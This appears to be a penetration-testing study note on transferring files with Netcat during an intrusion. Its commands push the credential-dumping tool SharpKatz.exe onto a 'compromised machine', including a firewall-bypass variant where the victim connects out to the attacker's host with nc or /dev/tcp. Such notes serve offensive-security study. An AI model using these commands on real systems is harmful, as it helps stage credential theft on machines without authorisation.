---
title: File_Transfer_Netcat
tags:
  - netcat
  - file_sharing
created: 2025-02-25
---
# Description
`Netcat` is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

## File Transfer with Netcat
The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
### Sending File
#### Target host listening on port 8000
```sh
nc -l -p 8000 > SharpKatz.exe
```

#### Attack host sending file to compromised machine
```sh
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

### Sending File as Input to Netcat
Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.
####  Attack host listening on port 443
```sh
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine - Connecting to Receive File
```sh
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

#### Compromised Machine - Using /dev/tcp to Receive File
```sh
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe